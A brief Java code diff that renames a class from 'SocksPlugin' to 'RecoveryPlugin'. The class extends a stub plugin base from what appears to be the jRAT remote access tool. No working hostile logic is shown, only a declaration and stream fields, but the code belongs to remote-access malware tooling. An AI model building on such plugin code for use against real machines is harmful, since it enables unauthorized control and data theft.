@@ -6,7 +6,7 @@ import java.io.DataOutputStream;
 import jrat.api.stub.StubPlugin;
 
 @SuppressWarnings("unused")
-public class SocksPlugin extends StubPlugin {
+public class RecoveryPlugin extends StubPlugin {
 	
 	private DataInputStream dis;
 	private DataOutputStream dos;
